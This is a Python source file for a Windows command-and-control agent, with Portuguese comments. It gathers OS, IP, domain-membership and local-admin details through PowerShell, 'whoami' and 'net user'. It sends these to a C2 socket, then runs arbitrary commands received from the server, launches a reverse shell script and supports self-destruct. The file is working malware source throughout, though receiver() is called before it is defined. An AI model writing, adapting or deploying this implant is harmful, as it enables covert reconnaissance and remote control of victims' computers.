import signal
import argparse
import socket
import subprocess
import sys
import threading
import os
import psutil
import time
from win32com.shell import shell

exit_event = threading.Event()

def startrevshellcli():
    subprocess.call("C:/Users/public/pyrevshell_client.py")
    exit_event.set()

# Configurações do servidor
host = "127.0.0.1"  # IP para conexão
port = 4545         # Porta para conexão
breaktheloop = False # Usado como controle de loop (sem uso claro)

# Coleta de informações do sistema
OnADomain = "False"
LocalAdmin = "False"
osinfo = subprocess.run("powershell.exe -command Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | findstr Microsoft", capture_output=True, text=True)
osinfo = osinfo.stdout.strip()

try:
    ipaddrinfo = subprocess.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
    ipaddrinfo = ipaddrinfo.stdout.strip()
except:
    ipaddrinfo = "No IP addresses active on system"

try:
    # Verifica se está em um domínio
    domaininfo = subprocess.run("whoami /FQDN", capture_output=True, text=True)
    if "Unable" in domaininfo.stderr:
        OnADomain = "False"
        print("[-] NOT domain joined")
    else:
        print("[+] domain joined!")
        OnADomain = "True"
except:
    print("[!] unexpected error...")

gathering = subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)

# Verifica se o usuário é administrador
if "Administrators" in gathering.stdout:
    print("[+] members of local admins!")
    LocalAdmin = "True"

# Monta informações coletadas
if OnADomain == "True":    
    info = os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
else:
    info = os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo

# Conexão com o servidor C2
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))  # Conecta ao servidor
client.send(info.encode('UTF-8'))  # Envia informações coletadas

# Cria uma thread para receber comandos do servidor
handler_thread = threading.Thread(target=receiver, args=(client,))
handler_thread.daemon = True
handler_thread.start()

# Mantém o cliente ativo
while True:
    time.sleep(1)

def receiver(client):
    while True:
        try:
            # Recebe dados do servidor
            data = client.recv(1024)
        except:
            print("server must have died...time to hop off")
            client.close()
            os._exit(0) 
        data = data.decode('UTF-8')  # Decodifica os dados recebidos
        
        if ":msg:" in data:
            print(data)
        if ":whoami:" in data:
            whoami = os.getlogin()
            client.send(whoami.encode())
       
        if ":shell:" in data:  # Inicia um shell reverso
            exit_event.clear()
            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
        
        if "c0mm@nd" in data:  # Executa um comando
            command = data.split("\n")
            command = command[1]
            print("command: ", command)
            proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            client.send(b"returned output: \n" + proc.stdout.read())
            proc.stdin.close()
            proc.terminate()
            
        if "self-destruct" in data:  # Destrói o agente
            client.close()
            os._exit(0)
